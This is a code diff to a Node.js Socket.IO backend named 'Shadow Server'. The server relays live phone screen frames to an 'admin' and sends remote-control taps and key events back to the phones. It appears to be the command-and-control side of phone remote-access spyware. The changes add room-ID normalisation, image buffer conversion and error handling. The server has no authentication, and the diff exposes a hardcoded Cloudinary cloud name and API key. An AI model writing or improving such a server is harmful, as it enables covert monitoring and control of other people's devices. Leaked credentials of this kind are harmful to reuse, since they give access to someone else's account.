@@ -12,21 +12,21 @@ const server = http.createServer(app); // ✅ HTTP Server Wrapper
 const PORT = process.env.PORT || 3000;
 
 // ==================================================
-// 🔥 1. SOCKET.IO SETUP (100MB LIMIT FIX)
+// 🔥 1. SOCKET.IO SETUP (ULTRA STABLE MODE)
 // ==================================================
 const io = new Server(server, {
     cors: {
         origin: "*", // Allow all connections
         methods: ["GET", "POST"]
     },
-    // 🔥 YE HAI MAIN FIX: 100 MB Limit
+    // 🔥 FIX 1: 100MB Buffer Limit
     maxHttpBufferSize: 1e8, 
-    // Connection stable rakhne ke liye settings
+    // 🔥 FIX 2: Connection Timeout Badhaya (Slow network ke liye)
     pingTimeout: 60000, 
     pingInterval: 25000
 });
 
-// --- 2. CLOUDINARY CONFIG (DO NOT CHANGE) ---
+// --- 2. CLOUDINARY CONFIG ---
 cloudinary.config({
     cloud_name: 'dxnh5vuik',
     api_key: '185953318184881',
@@ -39,7 +39,7 @@ if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
 app.use(cors({ origin: '*' }));
 
-// 🔥 Body Parser Limit bhi 100MB kar di hai (Backup ke liye)
+// Body Parser Limits (100MB)
 app.use(bodyParser.json({ limit: '100mb' }));
 app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
 app.use(express.static(__dirname));
@@ -48,32 +48,76 @@ app.use(express.static(__dirname));
 let devicesStatus = {}; 
 
 // ==================================================
-// 🔥 4. LIVE SCREEN SOCKET LOGIC
+// 🔥 4. LIVE SCREEN SOCKET LOGIC (UPDATED & FIXED)
 // ==================================================
 io.on('connection', (socket) => {
     console.log('🔌 New Connection:', socket.id);
 
-    // 1. Join Room
+    // 1. Join Room (Case Insensitive Fix)
     socket.on('join', (roomID) => {
-        socket.join(roomID);
-        console.log(`🔗 Socket Joined Room: ${roomID}`);
+        if (!roomID) return;
+        // ID ko humesha lowercase me convert karke join karwayenge
+        const cleanID = roomID.toString().toLowerCase().trim();
+        socket.join(cleanID);
+        console.log(`🔗 Socket Joined Room: ${cleanID}`);
     });
 
-    // 2. SCREEN SHARE (Phone -> Server -> Admin)
+    // 2. SCREEN SHARE (Smart Handling)
     socket.on('screen-data', (data) => {
-        // Yahan hum data ko process nahi kar rahe, seedha bhej rahe hain
-        // Taaki Server slow na ho. Browser khud sambhal lega badi image ko.
-        if (data && data.room) {
-            socket.to(data.room).emit('screen-data', data);
+        try {
+            if (!data) return;
+
+            // STEP A: Data Extract Karo
+            let targetRoom = null;
+            let finalImage = null;
+
+            // Agar data object hai { room: "...", image: "..." }
+            if (typeof data === 'object' && data.room && data.image) {
+                targetRoom = data.room.toString().toLowerCase().trim();
+                finalImage = data.image;
+            }
+            // Agar App ne galti se bina room ke bhej diya (Fallback)
+            else if (data.image) {
+                finalImage = data.image;
+                // Yahan hume room nahi pata, to hum assume karte hain socket join kiya hua hai
+                // (Ye case rarely ayega agar app sahi bana hai)
+            }
+
+            // STEP B: Binary Buffer Fix (Agar image 'Buffer' format me hai to Base64 banao)
+            if (Buffer.isBuffer(finalImage)) {
+                finalImage = "data:image/jpeg;base64," + finalImage.toString('base64');
+            } 
+            // Agar Raw Base64 string hai bina header ke
+            else if (typeof finalImage === 'string' && !finalImage.startsWith('data:image')) {
+                // Check karte hain ki ye JPEG hai ya PNG (Header lagana pad sakta hai)
+                // Filhal simple rakhte hain, Client side JS sambhal lega
+            }
+
+            // STEP C: Bhejo (Broadcast)
+            if (targetRoom && finalImage) {
+                // Hum wapas wahi structure bhejenge jo HTML expect kar raha hai
+                socket.to(targetRoom).emit('screen-data', { 
+                    room: targetRoom, 
+                    image: finalImage 
+                });
+            }
+
+        } catch (error) {
+            console.error("❌ Frame Error:", error.message);
         }
     });
 
-    // 3. REMOTE CONTROL (Admin -> Server -> Phone)
+    // 3. REMOTE CONTROL
     socket.on('control-event', (data) => {
-        const { room, action, x, y, key } = data; 
-        if (room) {
-            socket.to(room).emit('control-event', { action, x, y, key });
-            console.log(`🎮 Command sent to ${room}: ${action}`);
+        try {
+            const { room, action, x, y, key } = data; 
+            if (room) {
+                const cleanID = room.toString().toLowerCase().trim();
+                socket.to(cleanID).emit('control-event', { action, x, y, key });
+                console.log(`🎮 Command sent to ${cleanID}: ${action}`);
+            }
+        } catch (e) {
+            console.error("Control Error", e);
         }
     });
 
@@ -84,7 +128,7 @@ io.on('connection', (socket) => {
 
 // --- ROOT ROUTE ---
 app.get('/', (req, res) => {
-    res.send('✅ Shadow Server is Running (High Capacity Mode 100MB)');
+    res.send('✅ Shadow Server is Running (Auto-Fix Mode 100MB)');
 });
 
 // ==================================================
@@ -238,4 +282,4 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
 });
 
 // ✅ SERVER START
-server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} (100MB Socket Allowed)`));
+server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} (Smart Fix Mode)`));
